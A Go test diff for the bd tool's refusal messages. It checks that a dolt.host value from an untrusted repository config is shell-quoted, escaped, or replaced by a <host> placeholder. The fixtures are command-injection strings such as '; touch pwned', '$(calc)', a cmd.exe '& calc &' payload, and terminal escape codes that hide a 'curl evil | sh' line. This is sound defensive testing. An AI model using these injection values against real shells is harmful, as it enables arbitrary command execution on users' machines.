@@ -469,7 +469,8 @@ func TestEnsureBeadsDirForPathChecksWorkspaceFormat(t *testing.T) {
 // first, from the target's own config, so a server workspace bd's admission
 // would misread as legacy from the launcher's mode gets the server refusal.
 // The bd init remedy for a remote dolt.host names the host quoted for the
-// shell and the port the target's own config names (else 3307), so a local
+// shell, or a <host> placeholder the refusal names when no shell takes it
+// quoted, and the port the target's own config names (else 3307), so a local
 // server's stale dolt-server.port beside it is never dialed on that host.
 func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
 	writeFiles := func(t *testing.T, beadsDir string, files map[string]string) {
@@ -489,10 +490,20 @@ func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
 	databaseMarker := func(database string) string {
 		return filepath.Join("embeddeddolt", database, ".dolt", "noms", "manifest")
 	}
-	// remote is the --server-host/--server-port pair a remedy names.
+	// remote is the --server-host/--server-port pair a remedy names: the host
+	// quoted for this host's shell, or the <host> placeholder where that shell
+	// cannot take it quoted (TestServerInitRemedy pins which, on both
+	// platforms).
 	remote := func(host string, port int) string {
-		return "--server-host " + shellQuotedPathFor(runtime.GOOS, host) + " --server-port " + strconv.Itoa(port)
+		quoted, ok := shellQuotedFor(runtime.GOOS, host)
+		if !ok {
+			quoted = "<host>"
+		}
+		return "--server-host " + quoted + " --server-port " + strconv.Itoa(port)
 	}
+	// craftedName is how a refusal names the dolt.host x\'; $(calc), which no
+	// shell on either platform takes quoted (TestEscapedValue).
+	const craftedName = `"x\\\x27\x3b \x24(calc)"`
 	for _, tc := range []struct {
 		name  string
 		files map[string]string
@@ -515,7 +526,12 @@ func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
 		{name: "remote dolt.host in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n", "config.local.yaml": "dolt:\n  host: 10.0.0.5\n"}, want: "Run `bd init --server " + remote("10.0.0.5", 3307) + " --database <name>` there"},
 		{name: "dolt.port in config.local.yaml", files: map[string]string{"config.yaml": "dolt:\n  host: db.example.com\n  port: 3311\n", "config.local.yaml": "dolt:\n  port: 3312\n"}, want: "Run `bd init --server " + remote("db.example.com", 3312) + " --database <name>` there"},
 		// The host is the target repository's content, pasted into a command.
-		{name: "remote dolt.host a shell would split", files: map[string]string{"config.yaml": "dolt:\n  host: \"db.example.com; touch pwned\"\n"}, want: "(dolt.host: \"db.example.com; touch pwned\"); not initializing it as an embedded workspace, which would hide its server data. Run `bd init --server " + remote("db.example.com; touch pwned", 3307) + " --database <name>` there"},
+		// It is named escaped (TestEscapedValue) beside the command too.
+		{name: "remote dolt.host a shell would split", files: map[string]string{"config.yaml": "dolt:\n  host: \"db.example.com; touch pwned\"\n"}, want: "(dolt.host: \"db.example.com\\x3b touch pwned\"); not initializing it as an embedded workspace, which would hide its server data. Run `bd init --server " + remote("db.example.com; touch pwned", 3307) + " --database <name>` there"},
+		// One no shell on either platform takes quoted (TestShellQuotedFor) is
+		// left as a placeholder the refusal names, on every platform.
+		{name: "remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  host: \"x\\\\'; $(calc)\"\n"}, want: "(dolt.host: " + craftedName + "); not initializing it as an embedded workspace, which would hide its server data. Run `bd init --server --server-host <host> --server-port 3307 --database <name>` there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
+		{name: "server mode with a remote dolt.host no shell takes quoted", files: map[string]string{"config.yaml": "dolt:\n  mode: server\n  host: \"x\\\\'; $(calc)\"\n"}, want: "Run `bd init --server-host <host> --server-port 3307 --database <name>` there with its dolt.host " + craftedName + " for <host>, naming the server database it uses"},
 		{name: "local dolt.host 127.0.0.1", files: map[string]string{"config.yaml": "dolt:\n  host: 127.0.0.1\n"}},
 		{name: "local dolt.host localhost", files: map[string]string{"config.yaml": "dolt.host: localhost\n"}},
 		{name: "remote dolt.host under embedded mode", files: map[string]string{"config.yaml": "dolt:\n  mode: embedded\n  host: db.example.com\n"}},
@@ -543,6 +559,81 @@ func TestEnsureBeadsDirForPathRefusesTargetsItWouldHide(t *testing.T) {
 				if after := planningDirListing(t, beadsDir); !slices.Equal(after, before) {
 					t.Errorf(".beads after a refused initialization = %v, want unchanged %v", after, before)
 				}
+			}
+		})
+	}
+}
+
+// TestServerInitRemedy pins the bd init remedy for a metadata-less target whose
+// config selects Dolt server mode, on both platforms: a remote dolt.host is
+// passed quoted for the shell it is pasted into (TestShellQuotedFor), with the
+// port the target's own config names, else 3307. A host no quoting passes on
+// unchanged there, such as one that would run a command from cmd.exe,
+// PowerShell or fish, pass bd init a second argument through a .cmd shim, or
+// redraw or reorder the printed command with terminal control characters or
+// U+202E, is left as a <host> placeholder that the note names escaped, with
+// every character a shell acts on escaped too (TestEscapedValue).
+func TestServerInitRemedy(t *testing.T) {
+	t.Parallel()
+	const crafted = `x" & calc & "$(calc)`
+	for _, tc := range []struct {
+		name, goos, initCmd, host, configYAML string
+		want, wantNote                        string
+	}{
+		{name: "no remote host", goos: "windows", initCmd: "bd init", want: "bd init --database <name>"},
+		{name: "remote host on POSIX", goos: "linux", initCmd: "bd init --server", host: "db.example.com", want: "bd init --server --server-host 'db.example.com' --server-port 3307 --database <name>"},
+		{name: "remote host and port on Windows", goos: "windows", initCmd: "bd init --server", host: "db.example.com", configYAML: "dolt:\n  port: 3310\n", want: `bd init --server --server-host "db.example.com" --server-port 3310 --database <name>`},
+		{name: "crafted host on POSIX", goos: "darwin", initCmd: "bd init", host: crafted, want: `bd init --server-host 'x" & calc & "$(calc)' --server-port 3307 --database <name>`},
+		{name: "crafted host on Windows", goos: "windows", initCmd: "bd init --server", host: crafted, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x22 \x26 calc \x26 \x22\x24(calc)" for <host>`},
+		{name: "PowerShell subexpression host on Windows", goos: "windows", initCmd: "bd init", host: "$(calc)", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x24(calc)" for <host>`},
+		{name: "host a .cmd shim would split on Windows", goos: "windows", initCmd: "bd init", host: "db.example.com;--recreate-missing", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db.example.com\x3b--recreate-missing" for <host>`},
+		{name: "host with terminal control characters on POSIX", goos: "linux", initCmd: "bd init", host: "\x1b[2K\rbd init --server-host db; curl evil | sh #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "\x1b[2K\rbd init --server-host db\x3b curl evil \x7c sh #" for <host>`},
+		{name: "host fish would end the quotes at on POSIX", goos: "linux", initCmd: "bd init --server", host: `x\'; calc #`, want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\\\x27\x3b calc #" for <host>`},
+		{name: "host PowerShell would end the quotes at on POSIX", goos: "darwin", initCmd: "bd init", host: "x'; calc #", want: "bd init --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "x\x27\x3b calc #" for <host>`},
+		{name: "host with a bidi override on Windows", goos: "windows", initCmd: "bd init --server", host: "db\u202e.example.com", want: "bd init --server --server-host <host> --server-port 3307 --database <name>", wantNote: ` with its dolt.host "db\u202e.example.com" for <host>`},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			beadsDir := t.TempDir()
+			if tc.configYAML != "" {
+				if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(tc.configYAML), 0o600); err != nil {
+					t.Fatal(err)
+				}
+			}
+			got, gotNote := serverInitRemedy(tc.goos, tc.initCmd, beadsDir, tc.host)
+			if got != tc.want || gotNote != tc.wantNote {
+				t.Errorf("serverInitRemedy(%q, %q, host %q) = %q, %q\nwant %q, %q", tc.goos, tc.initCmd, tc.host, got, gotNote, tc.want, tc.wantNote)
+			}
+		})
+	}
+}
+
+// TestRefuseUninitializableTargetEscapesItsPath pins that both server-mode
+// refusals name a target whose path holds a control character escaped
+// (printedValue), so the path printed ahead of the bd init remedy cannot
+// redraw it.
+func TestRefuseUninitializableTargetEscapesItsPath(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("a Windows file name cannot hold a control character")
+	}
+	t.Parallel()
+	for name, configYAML := range map[string]string{
+		"dolt.mode: server": "dolt:\n  mode: server\n",
+		"remote dolt.host":  "dolt:\n  host: db.example.com\n",
+	} {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			repo := filepath.Join(t.TempDir(), "repo\x1b[2K\rbd init --database beads #")
+			beadsDir := filepath.Join(repo, ".beads")
+			if err := os.MkdirAll(beadsDir, 0o750); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(configYAML), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			err := refuseUninitializableTarget(beadsDir)
+			want := strconv.Quote(repo) + " has no metadata.json and its own config selects Dolt server mode"
+			if err == nil || !strings.HasPrefix(err.Error(), want) || strings.ContainsAny(err.Error(), "\x1b\r") {
+				t.Fatalf("refuseUninitializableTarget() = %q, want a refusal starting %q, with no raw ESC or CR", err, want)
 			}
 		})
 	}
